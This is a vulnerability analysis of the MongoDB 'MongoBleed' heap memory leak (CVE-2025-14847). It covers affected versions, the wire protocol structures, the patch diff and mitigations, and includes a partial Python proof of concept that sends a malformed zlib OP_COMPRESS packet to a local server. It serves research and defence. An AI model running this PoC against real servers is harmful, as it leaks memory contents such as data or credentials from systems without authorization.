**Exploit Title**: MongoBleed
**Category**: network
**Vulnerability**: Unauthenticated Heap Memory Leak/Information Disclosure
**CVSS**: 7.5 High
**Programming Language**: C++
**References:**
- https://nvd.nist.gov/vuln/detail/CVE-2025-14847
- https://github.com/mongodb/mongo/commit/37c7455a82963df4cf7c83204c0e7cfd6bae044b
- https://www.akamai.com/blog/security-research/cve-2025-14847-all-you-need-to-know-about-mongobleed
- https://www.mongodb.com/docs/manual/reference/mongodb-wire-protocol/#std-label-wp-message-header
## Description
The MongoDB Wire Protocol contain a vulnerability where attacker can send a malformed Zlib compressed packet leading to unauthenticated heap memory leakage.

| Version | Affected       | Fixed  |
| ------- | -------------- | ------ |
| 8.2.x   | 8.2.0 - 8.2.2  | 8.2.3  |
| 8.0.x   | 8.0.0 - 8.0.16 | 8.0.17 |
| 7.0.x   | 7.0.0 - 7.0.27 | 7.0.28 |
| 6.0.x   | 6.0.0 - 6.0.26 | 6.0.27 |
| 5.0.x   | 5.0.0 - 5.0.31 | 5.0.32 |
## Background
The Wire protocol developed to communicate with MongoDB servers. A typical packet look like this:
```c++
struct MsgHeader {
    int32   messageLength; // total message size, including this
    int32   requestID;     // identifier for this message
    int32   responseTo;    // requestID from the original request
                           //   (used in responses from the database)
    int32   opCode;        // message type
}
```
where the `opCode` defines the type of request made. The vulnerability lies in the `OP_COMPRESS` opcode, this packet will compress the original packet making communication faster and less load heavy. There are many ways to compress but the vulnerable implementation is in the Zlib compression.
```c++
struct {
    MsgHeader header;            // standard message header
    int32  originalOpcode;       // value of wrapped opcode
    int32  uncompressedSize;     // size of deflated compressedMessage, excluding MsgHeader
    uint8  compressorId;         // ID of compressor that compressed message
    char    *compressedMessage;  // opcode itself, excluding MsgHeader
}
```
In particular the `uncompressedSize` value can be set beyond the actual size of original message, which lead to uninitialized heap memory leakage.
## Static Analysis
In `src/mongo/transport/message_compressor_zlip.cpp` line 83 the following update was made.
```c++
return {output.length()};
```
![[Pasted image 20260108001125.png]]
This function deals with compressing and decompressing data with Zlib network compression. Here instead of trusting the length define in the packet, the length is instead calculated from the entire output size.
## Dynamic Analysis
Simple PoC to orchestrate the communication of Wire request/responses.
- Improvements: Need to actually retrieve and decompress the response to find information disclosure.

```python
# CVE-2025-14847
# Exploit Title: MongoBleed
# Category: network
# Vulnerability: Unauthenticated Heap Memory Leak/Information Disclosure
# CVSS: 7.5 HIGH
# Programming Language: C++

import socket
import bson
import struct
import zlib
from decode import decode_response


# STRUCTURE OF BSON WIRE PROTOCOL

# struct MsgHeader {

#     int32   messageLength; // total message size, including this
#     int32   requestID;     // identifier for this message
#     int32   responseTo;    // requestID from the original request
#                            //   (used in responses from the database)
#     int32   opCode;        // message type
# }

  

# Connecting to MongoDB server
mongod_port = 27017
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("localhost", mongod_port))

# --------------------
# BUILD OP_MSG body
# --------------------

payload = bson.encode({
    "hello": 1,
    "$db": "mongoBleed",
    "compression": ["zlib"]
})

flags = struct.pack("<i", 0)
kind = struct.pack("B", 0)
message_body = flags + kind + payload

# --------------------
# BUILD OP_COMPRESS body
# --------------------

# Vulnerability exist in opCode OP_COMPRESS = 2012

# struct {
#     MsgHeader header;            // standard message header
#     int32  originalOpcode;       // value of wrapped opcode
#     int32  uncompressedSize;     // size of deflated compressedMessage, excluding MsgHeader
#     uint8  compressorId;         // ID of compressor that compressed message
#     char    *compressedMessage;  // opcode itself, excluding MsgHeader
# }

  

original_opcode = 2013
uncompressed_size = len(message_body) # <---- EXPLOIT: + any number of buffer
compressor_id = 2 # zlib compressor id
compressed_message = zlib.compress(message_body)

  
op_compress_body = (
    struct.pack("<iiB", original_opcode, uncompressed_size, compressor_id)
    + compressed_message
)

message_length = 16 + len(op_compress_body)
request_id = 1
response_id = 0
opcode = 2012 # OP_COMPRESS opcode

compress_header = struct.pack("<iiii", message_length, request_id, response_id, opcode)

  
# Sending packet
sock.sendall(compress_header + op_compress_body)
response_data = sock.recv(8192)

  
# TODO: Decode the response data
print(response_data)
sock.close()
```
## Mitigations
- Update to latest patched version.
- Disable compressed requests entirely, which the MongoDB server will reject OP_COMPRESS packets entirely.